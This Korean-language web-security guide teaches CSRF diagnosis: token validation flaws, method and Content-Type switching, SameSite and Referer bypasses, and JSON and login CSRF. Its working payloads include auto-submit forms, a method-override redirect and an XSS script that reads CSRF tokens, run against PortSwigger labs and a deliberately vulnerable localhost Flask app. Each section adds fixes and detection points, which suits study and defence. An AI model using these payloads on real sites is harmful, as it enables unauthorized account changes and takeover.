---
title: 웹 취약점 진단 CSRF편 — 토큰 검증부터 SameSite 우회까지
description: "CSRF 토큰 검증 결함, 메서드·Content-Type 전환, SameSite·Referer 우회, JSON·로그인 CSRF와 XSS 결합을 다루는 심화 진단 가이드입니다."
tags:
  - 웹보안
  - 취약점진단
  - CSRF
  - SameSite
  - 세션보안
---

> [!warning] 허가된 환경에서만
> 아래 요청은 **본인이 소유하거나 명시적으로 허가받은 환경**, PortSwigger Web Security Academy, 또는 이 글의 `127.0.0.1`·`localhost` Docker 실습에서만 실행하세요. 실제 서비스나 제3자 계정으로 폼을 전송하지 않습니다.

CSRF는 “POST라서 생기는 문제”가 아니라, 브라우저가 쿠키 같은 주변 자격증명을 자동으로 붙이는 요청을 서버가 **사용자의 의도와 구분하지 못하는 문제**입니다. 인증·세션 기초는 [[웹 취약점 진단 인증편 — 계정 잠금 우회부터 세션 하이재킹까지]], SOP·CORS·SameSite의 관계는 [[웹 취약점 진단 설정편 — CORS·SOP부터 후속 공격까지]]를 먼저 참고합니다.

## 한눈에 보는 기법 요약

| 기법 | 단서 | 성립 조건 | 영향 | 실습 |
|---|---|---|---|---|
| 토큰 부재 | 상태 변경 요청에 예측 불가능 값 없음 | 쿠키 인증 + 교차 출처에서 만들 수 있는 요청 | 계정 설정·데이터 변경 | PortSwigger 기본 랩 |
| 토큰 미바인딩 | 다른 세션의 토큰도 수락 | 토큰의 유효성만 보고 현재 세션과 연결하지 않음 | 피해자 권한의 상태 변경 | PortSwigger 랩 |
| 메서드·Content-Type 변경 | GET·폼·`text/plain`도 같은 로직 처리 | 특정 메서드/미디어 타입에서 검증 생략 | 토큰 검증 우회·JSON CSRF | PortSwigger + localhost Docker |
| SameSite Lax/Strict 우회 | GET 상태 변경, `_method`, sibling XSS, 최근 쿠키 | top-level GET, same-site gadget, 기본 Lax의 예외 | 쿠키를 동반한 교차 사이트 요청 | PortSwigger 랩 4개 |
| Referer 검증 우회 | 헤더 없으면 허용, 부분 문자열 비교 | Referrer Policy로 헤더 제거/조작된 URL 포함 가능 | 출처 검증 우회 | PortSwigger 랩 2개 |
| 로그인 CSRF | 로그인 요청에 CSRF 방어 없음 | 공격자 자격증명으로 피해자 브라우저를 로그인시킴 | 피해자 활동이 공격자 계정에 귀속 | localhost Docker |
| XSS와 결합 | same-origin JS 실행 가능 | XSS가 토큰을 읽거나 인증 요청을 생성 | CSRF 방어 무력화, 계정 장악 | PortSwigger XSS 랩 |

---

## 1. 토큰 부재와 미바인딩 — “값이 있다”가 아니라 “이 세션의 값인가”

### 원리·단서 기능·성립 조건

상태 변경 요청이 세션 쿠키만으로 승인되고 공격자가 모든 파라미터를 알 수 있으면 기본 CSRF가 성립합니다. 토큰이 있어도 서버가 “발급한 토큰 중 하나인가”만 확인하고 **현재 피해자 세션에 발급한 값인지** 확인하지 않으면 공격자는 자기 계정에서 얻은 토큰을 피해자 요청에 넣을 수 있습니다.

단서는 숨은 `csrf` 필드가 없거나, 로그인 전후·계정 간 토큰이 같거나, 다른 세션의 토큰으로 2xx/302와 실제 상태 변화가 발생하는 경우입니다.

### 따라하기 A — 토큰 부재

[Lab: CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="csrf-lab@example.com">
</form>
<script>document.forms[0].submit()</script>
```

exploit server에서 저장·열기 후 피해자 계정 이메일이 바뀌면 성공입니다. CORS 응답을 읽지 못해도 요청 전송과 상태 변경은 가능합니다.

### 따라하기 B — 토큰 미바인딩

[Lab: CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

1. `wiener:peter` 세션에서 이메일 변경 요청과 CSRF 토큰을 확보합니다.
2. 별도 세션의 요청에 **첫 세션 토큰**을 넣어 Repeater로 보냅니다.
3. 요청이 수락되면 그 토큰을 자동 제출 폼에 넣습니다.

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=VICTIM_SESSION
Content-Type: application/x-www-form-urlencoded

email=csrf-lab%40example.com&csrf=TOKEN_FROM_OTHER_SESSION
```

다른 세션의 토큰인데도 피해자 이메일이 변경되어야 성공입니다.

### 진단 체크리스트와 오탐 구분

- [ ] 토큰 삭제, 빈 값, 임의 값, 다른 세션 값의 네 경우를 비교했다.
- [ ] 응답 코드뿐 아니라 실제 상태 변화를 확인했다.
- [ ] 토큰이 요청 본문이 아닌 헤더·쿠키에 있는지도 확인했다.
- [ ] 공격자가 알 수 없는 필수값이나 재인증이 있으면 성립 조건에서 제외했다.

### 조치

토큰은 CSPRNG로 생성해 서버 측 세션에 저장하고, 모든 상태 변경 요청에서 상수 시간 비교로 검증합니다. stateless가 필요하면 세션 식별자와 nonce에 대한 HMAC을 사용하되 원본 세션 ID를 토큰에 노출하지 않습니다.

```python
import hmac


def valid_csrf(submitted: str, session_token: str) -> bool:
    expected = session_token  # lab notation: store a random token in the server session
    return hmac.compare_digest(submitted, expected)
```

### 탐지 포인트

토큰 누락·불일치의 반복, 같은 토큰이 여러 세션·계정에서 사용되는 패턴, 상태 변경 요청의 교차 사이트 `Sec-Fetch-Site`를 기록합니다.

### 출처

- [PortSwigger — Bypassing CSRF token validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## 2. 메서드·Content-Type 변경 — 보호 로직과 비즈니스 로직의 라우팅 차이

### 원리·단서 기능·성립 조건

보안 필터가 POST+JSON 요청에만 토큰을 검사하지만 컨트롤러가 GET, 폼 인코딩, `text/plain`도 같은 상태 변경 로직으로 보낸다면 검증을 비껴갑니다. 브라우저가 preflight 없이 만들 수 있는 “simple request”의 미디어 타입은 `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`입니다.

### 따라하기 A — 메서드 변경 공식 랩

[Lab: CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

```http
GET /my-account/change-email?email=method-lab%40example.com HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION
```

POST에서 잘못된 토큰은 거부되지만 GET으로 바꾸고 토큰을 제거했을 때 이메일이 바뀌면 성공입니다.

### 따라하기 B — Content-Type 변경과 JSON CSRF localhost 앱

빈 폴더에 다음 파일을 저장합니다. 피해자 앱은 HTTPS `127.0.0.1:5443`, 공격자 페이지는 HTTP `localhost:5080`이므로 브라우저 관점에서 cross-site입니다.

`docker-compose.yml`:

```yaml
services:
  victim:
    build: .
    environment:
      MODE: victim
    ports:
      - "127.0.0.1:5443:5443"
  attacker:
    build: .
    environment:
      MODE: attacker
    ports:
      - "127.0.0.1:5080:5080"
```

`Dockerfile`:

```dockerfile
FROM ghcr.io/astral-sh/uv:python3.12-bookworm-slim
WORKDIR /app
RUN apt-get update && apt-get install -y --no-install-recommends openssl \
    && rm -rf /var/lib/apt/lists/* \
    && uv pip install --system "flask==3.1.2" \
    && openssl req -x509 -newkey rsa:2048 -nodes -days 2 \
       -keyout /tmp/key.pem -out /tmp/cert.pem -subj "/CN=127.0.0.1"
COPY app.py .
CMD ["python", "app.py"]
```

`app.py`:

```python
import json
import os
import secrets

from flask import Flask, jsonify, make_response, request

app = Flask(__name__)
mode = os.environ.get("MODE", "victim")
sessions: dict[str, str] = {}
profile = {"email": "victim@example.com", "owner": "victim"}


@app.after_request
def headers(response):
    response.headers["Cache-Control"] = "no-store"
    return response


@app.get("/login-victim")
def login_victim():
    token = secrets.token_urlsafe(16)
    sessions[token] = "victim"
    response = make_response("victim session ready")
    response.set_cookie("session", token, secure=True, httponly=True, samesite="None")
    return response


@app.get("/login-fresh")
def login_fresh():
    token = secrets.token_urlsafe(16)
    sessions[token] = "victim"
    response = make_response("fresh default-Lax session ready")
    # Intentionally omit SameSite to demonstrate Chromium's temporary compatibility exception.
    response.set_cookie("fresh_session", token, secure=True, httponly=True)
    return response


@app.post("/api/profile")
def update_profile():
    user = sessions.get(request.cookies.get("session", ""))
    if user != "victim":
        return jsonify(error="login required"), 401
    # Intentionally vulnerable: accepts JSON-shaped text/plain to avoid CORS preflight.
    if request.mimetype == "application/json":
        data = request.get_json()
    else:
        data = json.loads(request.get_data(as_text=True))
    profile["email"] = data["email"]
    return jsonify(profile)


@app.post("/recent-change")
def recent_change():
    user = sessions.get(request.cookies.get("fresh_session", ""))
    if user != "victim":
        return jsonify(error="fresh cookie not sent"), 401
    profile["email"] = request.form.get("email", "")
    return jsonify(profile)


@app.get("/state")
def state():
    return jsonify(profile)


@app.post("/login")
def login():
    username = request.form.get("username", "")
    if username not in {"attacker", "victim"}:
        return "invalid", 403
    token = secrets.token_urlsafe(16)
    sessions[token] = username
    response = make_response(f"logged in as {username}")
    response.set_cookie("session", token, secure=True, httponly=True, samesite="Lax")
    return response


@app.get("/")
def attack_page():
    if mode != "attacker":
        return "victim app"
    selected = request.args.get("run", "")
    auto_submit = f"<script>{selected}.submit()</script>" if selected in {"json", "login", "recent"} else ""
    return """<!doctype html><meta charset=utf-8>
<form id=json action="https://127.0.0.1:5443/api/profile" method=POST enctype="text/plain">
  <input name='{"email":"json-csrf@example.com","padding":"' value='"}'>
</form>
<form id=login action="https://127.0.0.1:5443/login" method=POST>
  <input name=username value=attacker><input name=password value=known-lab-password>
</form>
<form id=recent action="https://127.0.0.1:5443/recent-change" method=POST>
  <input name=email value=recent-cookie@example.com>
</form>
<button onclick="json.submit()">JSON CSRF</button>
<button onclick="login.submit()">Login CSRF</button>
<button onclick="recent.submit()">Recent-cookie CSRF</button>""" + auto_submit


if __name__ == "__main__":
    if mode == "attacker":
        app.run(host="0.0.0.0", port=5080)
    else:
        app.run(host="0.0.0.0", port=5443, ssl_context=("/tmp/cert.pem", "/tmp/key.pem"))
```

```bash
docker compose up --build -d
curl -k -c victim.cookies https://127.0.0.1:5443/login-victim
curl -k -b victim.cookies https://127.0.0.1:5443/state
```

브라우저에서 인증서 경고를 localhost 실습에 한해 통과한 뒤 `https://127.0.0.1:5443/login-victim`을 열고, 다음 탭에서 `http://localhost:5080`의 **JSON CSRF** 버튼을 누릅니다. 자동 제출은 `http://localhost:5080/?run=json`을 사용합니다. 이후 상태를 확인합니다.

```bash
curl -k https://127.0.0.1:5443/state
# 기대: email이 json-csrf@example.com
```

폼이 만든 본문은 이름/값 때문에 여분 문자가 붙을 수 있습니다. Burp에서 실제 본문을 보고 JSON 파서가 수락하는 형태인지 확인하며, 성공 기준은 `Sec-Fetch-Site: cross-site` 요청이 preflight 없이 도착해 피해자 프로필이 바뀌는 것입니다.

### 진단 체크리스트와 오탐 구분

- [ ] POST↔GET, `_method`, `X-HTTP-Method-Override`를 비교했다.
- [ ] JSON 엔드포인트가 폼·`text/plain`·누락 Content-Type을 받는지 확인했다.
- [ ] OPTIONS preflight 성공 여부가 아니라 실제 상태 변화를 확인했다.
- [ ] 쿠키가 요청에 붙지 않아 401이면 JSON 파싱만으로 CSRF라 판정하지 않았다.

### 조치

상태 변경은 허용한 메서드 하나로 제한하고 모든 진입 경로에서 같은 CSRF 검증을 적용합니다. JSON API는 `Content-Type: application/json`을 엄격히 요구하고 JSON 모양의 `text/plain`을 파싱하지 않습니다. 교차 출처의 credentialed CORS는 정확한 origin allowlist만 사용합니다.

### 탐지 포인트

상태 변경 경로의 GET, `_method`, 비정상 Content-Type, `Sec-Fetch-Site: cross-site`와 쿠키 동반 요청을 경보로 묶습니다.

### 출처

- [PortSwigger — Bypassing CSRF token validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [MDN — CORS-safelisted request header](https://developer.mozilla.org/en-US/docs/Glossary/CORS-safelisted_request_header)
- [OWASP CSRF Prevention Cheat Sheet — Fetch Metadata](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#use-fetch-metadata-headers-to-verify-nature-of-the-request)

---

## 3. SameSite Lax·Strict 우회 — site와 origin을 혼동하지 않기

### 원리·단서 기능·성립 조건

SameSite의 site는 스킴과 eTLD+1 기준입니다. 따라서 `app.example.com`과 취약한 `cms.example.com`은 cross-origin이지만 same-site일 수 있습니다.

- **Lax + GET 상태 변경**: top-level GET 탐색에는 쿠키가 포함될 수 있습니다. GET 처리나 `_method=POST`가 상태를 바꾸면 우회됩니다.
- **Strict + 하위 도메인**: sibling domain의 XSS·오픈 리다이렉트 같은 gadget에서 요청을 만들면 same-site로 평가될 수 있습니다.
- **기본 Lax의 약 2분 예외**: Chrome은 SameSite를 생략해 기본 Lax로 처리한 새 쿠키에 대해, 설정 직후 짧은 시간 동안 top-level POST에 쿠키를 보내는 호환성 예외를 둘 수 있습니다. 명시적 `SameSite=Lax`와 구분해야 합니다.

### 따라하기 — PortSwigger 공식 랩

1. **GET/메서드 오버라이드**: [Lab: SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

```javascript
document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=lax-lab@example.com&_method=POST";
```

top-level 탐색에서 세션 쿠키가 붙고 이메일이 바뀌면 성공입니다.

2. **Strict on-site gadget**: [Lab: SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect). 댓글 확인 페이지의 클라이언트 리다이렉트가 공격자 제어 경로를 same-site 2차 요청으로 만드는지 Network에서 확인합니다.

3. **하위 도메인**: [Lab: SameSite Strict bypass via sibling domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain). `cms-YOUR-LAB-ID...`의 XSS가 주 애플리케이션 WebSocket 요청에 세션 쿠키를 붙이는지 확인합니다.

4. **2분 규칙 localhost 실습**: 앞 절 Docker 앱에서 `https://127.0.0.1:5443/login-fresh`를 열어 SameSite 속성이 생략된 `fresh_session`을 발급받습니다. 즉시 `http://localhost:5080/?run=recent`를 열고 `/state`에서 `recent-cookie@example.com` 변경을 확인합니다. 새 쿠키 발급 후 2분 이상 기다려 같은 요청을 다시 보내면 Chromium에서는 `fresh_session`이 빠져 401이 되는지 비교합니다. 브라우저 버전·정책에 따라 예외가 제거되었으면 그 사실을 결과에 기록하고, `SameSite`를 명시한 쿠키에는 이 예외를 기대하지 않습니다.

### 진단 체크리스트와 오탐 구분

- [ ] 쿠키가 `Strict`, 명시적 `Lax`, 속성 생략 중 무엇인지 구분했다.
- [ ] 요청의 site와 origin을 각각 계산했다.
- [ ] top-level 탐색인지 iframe/fetch인지 기록했다.
- [ ] 새 쿠키 발급 직후와 2분 이후를 비교했다.
- [ ] 쿠키가 실제 요청에 포함되고 상태가 바뀌었는지 확인했다.

### 조치

세션 쿠키에 업무에 맞는 `SameSite=Lax` 또는 `Strict`를 **명시적으로** 설정하되, 이것만으로 CSRF를 막았다고 가정하지 않습니다. 상태 변경 GET과 메서드 오버라이드를 제거하고, 모든 sibling origin을 독립된 신뢰 경계로 관리합니다. 중요한 동작에는 세션 바인딩 토큰과 재인증을 추가합니다.

### 탐지 포인트

top-level GET의 상태 변경, 로그인·OAuth 직후의 민감 POST, sibling origin Referer에서 온 요청, `_method` 사용을 탐지합니다.

### 출처

- [PortSwigger — Bypassing SameSite cookie restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
- [MDN — Set-Cookie SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value)

---

## 4. Referer 검증 우회 — 부재 허용과 부분 문자열 비교

### 원리·단서 기능·성립 조건

Referer는 개인정보 보호 정책·브라우저·중간 구성에 따라 생략되거나 축약될 수 있습니다. 서버가 “없으면 허용”하거나 예상 도메인이 문자열 어디엔가 포함되기만 하면 통과시키면 우회됩니다.

### 따라하기 A — 헤더 부재 허용

[Lab: CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)

exploit server 응답에 다음을 넣고 자동 제출 폼을 사용합니다.

```html
<meta name="referrer" content="never">
```

Burp에서 상태 변경 요청에 Referer가 없고 이메일이 바뀌면 성공입니다.

### 따라하기 B — 부분 문자열 비교

[Lab: CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)

```javascript
history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net");
```

exploit server의 Head에는 `Referrer-Policy: unsafe-url`을 설정합니다. Referer의 공격자 URL 쿼리에 목표 호스트가 포함되었을 뿐인데 요청이 수락되면 성공입니다.

### 진단 체크리스트와 오탐 구분

- [ ] 정상, 타 도메인, 헤더 제거, 쿼리/서브도메인 포함 값을 비교했다.
- [ ] URL을 문자열 포함이 아니라 파싱된 scheme/host/port로 비교하는지 확인했다.
- [ ] 프록시가 Referer를 바꾸는지 원본 브라우저 요청과 서버 로그를 대조했다.
- [ ] Referer 우회 후 상태 변화가 없으면 방어 우회 가능성만 별도로 기록했다.

### 조치

세션 바인딩 CSRF 토큰을 주 방어로 둡니다. Origin/Referer는 보조 방어로 **존재를 요구**하고 URL 파서로 정확한 origin을 비교합니다. `Sec-Fetch-Site: cross-site` 상태 변경 요청은 업무상 예외가 없다면 거부합니다.

### 탐지 포인트

Referer 부재, 목표 호스트 문자열이 쿼리·경로·공격자 서브도메인에 나타나는 요청, `unsafe-url` 출처의 상태 변경을 탐지합니다.

### 출처

- [PortSwigger — Bypassing Referer-based CSRF defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
- [MDN — Referer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)

---

## 5. JSON CSRF와 로그인 CSRF — 응답을 못 읽어도 공격은 끝날 수 있다

### 원리·단서 기능·성립 조건

JSON CSRF는 서버가 `text/plain`·폼 본문을 JSON으로 관대하게 해석하거나 credentialed CORS를 잘못 허용할 때 성립합니다. 로그인 CSRF는 로그인 요청에 토큰이 없어 공격자가 자기 계정 자격증명을 피해자 브라우저에 제출해 **피해자를 공격자 계정으로 로그인**시킬 때 성립합니다. 이후 피해자가 입력한 검색 기록·결제 정보·개인 데이터가 공격자 계정에 저장될 수 있습니다.

### 따라하기 — 앞 절 Docker 앱

1. JSON CSRF는 앞 절의 **JSON CSRF** 버튼과 `/state`로 확인합니다.
2. 로그인 CSRF는 공격자 페이지의 **Login CSRF** 버튼을 누르거나 `http://localhost:5080/?run=login`을 엽니다. 브라우저가 `https://127.0.0.1:5443/login`으로 이동해 `logged in as attacker`를 표시하면 성공입니다.
3. Burp에서 로그인 요청에 `Origin: http://localhost:5080` 또는 cross-site Fetch Metadata가 있는데도 세션 쿠키가 공격자 계정으로 발급되는지 확인합니다.

```http
POST /login HTTP/1.1
Host: 127.0.0.1:5443
Origin: http://localhost:5080
Content-Type: application/x-www-form-urlencoded

username=attacker&password=known-lab-password
```

로그인 성공 화면만으로 일반 CSRF 영향은 완성되지 않습니다. 후속으로 피해자 활동이 공격자 계정에 저장되는 기능이 있는지 확인하되, 이 localhost 앱 밖에서는 실제 개인정보를 입력하지 않습니다.

### 진단 체크리스트와 오탐 구분

- [ ] JSON 요청의 실제 Content-Type과 preflight 여부를 기록했다.
- [ ] `Access-Control-Allow-Origin`과 credentials 조합을 확인했다.
- [ ] 로그인 전 세션을 회전하고 기존 사용자의 세션과 섞이지 않는지 확인했다.
- [ ] 로그인 CSRF 뒤 공격자 계정으로 귀속되는 민감 동작이 있는지 확인했다.

### 조치

JSON API는 엄격한 미디어 타입과 세션 바인딩 토큰 또는 검증된 custom header를 요구합니다. 로그인 폼에도 CSRF 토큰과 Origin 검증을 적용하고, 인증 성공 시 세션 ID를 회전합니다. UI에는 현재 로그인 계정을 명확히 표시하고 민감 데이터 저장 전 재인증합니다.

### 탐지 포인트

cross-site Origin에서 온 로그인 성공, 한 브라우저에서 짧은 시간 내 서로 다른 계정 전환, `text/plain`인데 JSON 모양인 본문, preflight 없는 API 상태 변경을 탐지합니다.

### 출처

- [OWASP CSRF Prevention Cheat Sheet — Login CSRF](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#login-csrf)
- [PortSwigger — What is CSRF?](https://portswigger.net/web-security/csrf)

---

## 6. XSS와 결합 — 같은 출처 코드 실행은 토큰을 읽는다

### 원리·단서 기능·성립 조건

CSRF 토큰은 외부 출처가 값을 모른다는 가정으로 동작합니다. 같은 출처 XSS가 있으면 계정 페이지를 `fetch`해 토큰을 읽고, 올바른 헤더·본문으로 상태 변경 요청을 만들 수 있습니다. 따라서 “CSRF 토큰이 있어서 XSS 영향이 낮다”는 판단은 틀립니다.

### 따라하기 — PortSwigger 공식 랩

[Lab: Exploiting XSS to bypass CSRF defenses](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)

1. 댓글의 Stored XSS 실행을 확인합니다.
2. 스크립트가 `/my-account`를 요청해 숨은 `csrf` 값을 파싱하게 합니다.
3. 파싱한 토큰과 새 이메일을 `/my-account/change-email`로 POST합니다.
4. 피해자 이메일이 바뀌면 성공입니다.

```javascript
fetch("/my-account")
  .then((r) => r.text())
  .then((html) => /name="csrf" value="([^\"]+)"/.exec(html)?.[1])
  .then((csrf) => fetch("/my-account/change-email", {
    method: "POST",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: new URLSearchParams({csrf, email: "chain-lab@example.com"}),
  }));
```

### 진단 체크리스트와 오탐 구분

- [ ] XSS 실행 origin이 민감 API와 같은지 확인했다.
- [ ] CSP·Trusted Types가 실제 실행을 막는지 확인했다.
- [ ] 토큰 읽기와 상태 변경 둘 다 증명했다.
- [ ] alert만으로 CSRF 우회·계정 탈취를 단정하지 않았다.

### 조치

XSS를 문맥별 인코딩·안전한 DOM API·sanitizer로 제거하는 것이 우선입니다. CSRF 토큰은 계속 유지하고, 이메일·비밀번호·MFA 변경에는 현재 비밀번호나 WebAuthn 재인증을 추가해 XSS 한 번으로 계정이 영구 장악되지 않게 합니다.

### 탐지 포인트

계정 페이지 GET 직후 자동화된 설정 변경, 동일 세션의 비정상 짧은 간격 요청, CSP 위반과 CSRF 성공 이벤트의 상관관계를 봅니다.

### 출처

- [PortSwigger — XSS vs CSRF](https://portswigger.net/web-security/csrf/xss-vs-csrf)
- [PortSwigger — Exploiting XSS](https://portswigger.net/web-security/cross-site-scripting/exploiting)

---

## 다음 단계로 이어지는 공격

CSRF로 바꾼 이메일·비밀번호 복구·MFA 설정은 계정 장악으로 이어지고, 관리자 기능에 닿으면 권한 상승이나 다른 사용자 데이터 변경으로 확장됩니다. 하위 도메인 XSS나 same-site gadget을 얻은 경우 Strict 쿠키와 WebSocket까지 공격 표면이 넓어지며, XSS와 결합하면 토큰을 읽어 더 강한 상태 변경 요청을 만들 수 있습니다.

> [!success] 실습 검증 범위
> 2026-11-27에 Docker Engine 29.5.2와 Chrome Headless로 HTTPS victim·HTTP attacker 컨테이너를 직접 빌드·실행했습니다. `text/plain` JSON CSRF로 이메일이 `json-csrf@example.com`으로 바뀌는 것, 로그인 CSRF가 `logged in as attacker` 세션을 만드는 것, SameSite 미지정 쿠키 발급 직후 cross-site POST가 `recent-cookie@example.com` 변경을 만드는 것을 확인했습니다. 2분 경과 뒤 차단 비교는 대기 검증하지 않았고, PortSwigger 랩 URL은 모두 HTTP 200으로 확인했지만 개인 랩 인스턴스 풀이를 실행하지는 않았습니다.
